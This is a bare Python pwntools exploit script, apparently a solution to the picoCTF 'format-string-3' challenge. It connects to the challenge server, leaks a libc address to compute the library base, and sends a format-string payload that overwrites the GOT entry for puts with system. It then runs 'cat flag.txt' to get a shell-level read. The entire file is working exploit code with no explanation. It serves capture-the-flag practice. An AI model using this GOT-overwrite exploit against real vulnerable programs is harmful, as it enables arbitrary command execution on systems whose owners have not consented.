from pwn import *

elf =context.binary =ELF('./format-string-3')
libc =ELF('./libc.so.6')




#p =process()
p =remote('rhea.picoctf.net', 50962)

p.recvuntil(b'libc:')
leak =int(p.recv(),16)
libc.address = leak - libc.sym['setvbuf']



payload =fmtstr_payload(38,{elf.got['puts']:libc.sym['system']})

p.sendline(payload)
p.recv()

p.sendline(b'cat flag.txt')

p.interactive()
